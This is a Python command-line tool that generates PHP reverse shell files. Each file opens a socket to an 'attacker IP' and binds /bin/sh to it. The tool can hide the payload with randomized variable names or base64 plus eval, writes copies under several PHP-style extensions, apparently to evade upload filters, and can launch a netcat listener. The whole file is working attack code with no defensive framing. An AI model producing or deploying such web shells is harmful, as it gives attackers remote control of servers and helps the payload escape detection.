#!/usr/bin/env python3
import os
import argparse
import subprocess
import base64
import random
import string

def obfuscate_basic(ip: str, port: int) -> str:
    """Basic obfuscation using randomized variable names."""
    var_ip = ''.join(random.choices(string.ascii_letters, k=8))
    var_port = ''.join(random.choices(string.ascii_letters, k=8))
    var_sock = ''.join(random.choices(string.ascii_letters, k=8))
    var_proc = ''.join(random.choices(string.ascii_letters, k=8))

    payload = f"""<?php
${var_ip} = '{ip}';
${var_port} = {port};
${var_sock} = fsockopen(${var_ip}, ${var_port});
${var_proc} = proc_open('/bin/sh', array(0 => ${var_sock}, 1 => ${var_sock}, 2 => ${var_sock}), $pipes);
?>"""
    return payload

def obfuscate_base64(payload: str) -> str:
    """Encode payload in base64 and execute via eval."""
    encoded = base64.b64encode(payload.encode()).decode()
    return f"""<?php eval(base64_decode('{encoded}')); ?>"""

def generate_payload(ip: str, port: int, obfuscation: str = "none") -> str:
    raw_payload = f"""<?php
$ip = '{ip}';
$port = {port};
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>"""

    if obfuscation == "basic":
        return obfuscate_basic(ip, port)
    elif obfuscation == "base64":
        return obfuscate_base64(raw_payload)
    else:
        return raw_payload

def save_payload(filename: str, content: str):
    with open(filename, 'w') as f:
        f.write(content)
    print(f"[+] Payload saved as: {filename}")

def start_listener(port: int):
    print(f"[+] Starting Netcat listener on port {port}...")
    try:
        subprocess.run(["nc", "-nvlp", str(port)])
    except FileNotFoundError:
        print("[-] Netcat (nc) not found. Please install netcat or start listener manually.")
    except KeyboardInterrupt:
        print("\n[!] Listener stopped.")

def main():
    parser = argparse.ArgumentParser(description="Generate PHP reverse shells and start listener")
    parser.add_argument("--ip", required=True, help="Attacker IP address")
    parser.add_argument("--port", type=int, default=2001, help="Listener port (default: 2001)")
    parser.add_argument("--output", default="shell", help="Base filename (without extension)")
    parser.add_argument("--ext", nargs="+", default=["php"], 
                        choices=["php", "phtml", "php3", "php4", "php5", "php7", "inc"],
                        help="File extensions to generate")
    parser.add_argument("--obfuscate", choices=["none", "basic", "base64"], default="none",
                        help="Obfuscation level")
    parser.add_argument("--listen", action="store_true", help="Auto-start Netcat listener after generation")

    args = parser.parse_args()

    payload = generate_payload(args.ip, args.port, args.obfuscate)

    for ext in args.ext:
        filename = f"{args.output}.{ext}"
        save_payload(filename, payload)

    if args.listen:
        start_listener(args.port)

if __name__ == "__main__":
    main()
